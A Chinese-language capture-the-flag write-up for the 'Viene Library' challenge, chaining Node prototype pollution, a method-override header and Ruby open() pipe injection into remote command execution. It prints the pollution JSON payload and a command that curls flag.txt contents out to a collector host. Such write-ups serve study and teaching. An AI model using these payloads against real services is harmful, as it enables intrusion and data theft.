# Viene Library

## 题目简述

公开服务是 Node.js，内部 Rails 服务只接受本地请求。Node 固定用 POST 调用 Rails；Rails 的 PUT 分支却把请求体直接传给 Ruby `open()`。若字符串以 `|` 开头，`open()` 会启动子进程。利用链需要先通过原型污染给 `node-fetch` 注入方法覆盖头，再触发 Rails 的命令管道。

## 解题过程

`/submitaviene` 的递归合并函数遍历攻击者提供的每个键，并写入模板对象：

```javascript
function standardizeViene(template, viene) {
    for (let m in viene) {
        if (typeof viene[m] === "object", typeof template[m] === "object") {
            standardizeViene(template[m], viene[m]);
        } else {
            template[m] = viene[m];
        }
    }
}
```

条件错误地使用逗号运算符，且没有过滤 `__proto__`，可污染所有普通对象继承的 `headers`：

```json
{"__proto__":{"headers":{"X-HTTP-Method-Override":"PUT"}}}
```

`node-fetch` 的请求选项没有自有 `headers`，会继承污染值。Node 后续虽然声明 `method: 'POST'`，Rails 中间件看到 `X-HTTP-Method-Override: PUT` 后仍把请求路由到 PUT 分支。

再调用 `/findaviene`，让转发 body 以管道开头：

```json
{"viene":"|curl https://collector/ --data \"$(cat flag.txt)\""}
```

Rails 的黑名单只对整个请求体执行数组 `include?`，而且没有正确阻止 `|command`，随后 `open(request_body)` 启动 shell。外带内容为：

```text
maple{what_the_f_ck_is_up_kyle_no_what_did_you_say_what_the_fvck_dude_step_the_f_ck_up_kyle_88jd6g3qi98}}
```

末尾的两个 `}` 是比赛部署中的原始 flag，必须原样保留。

## 方法总结

原型污染的影响取决于后续“属性读取 gadget”；本题 gadget 是 `node-fetch` 对继承 `headers` 的读取，Rails 的方法覆盖头再把 POST 变成 PUT。Ruby `open()` 不应接收用户控制字符串，应改用 `File.open` 并限定固定目录。跨语言服务链中，每层看似独立的兼容特性可能组合成 RCE。
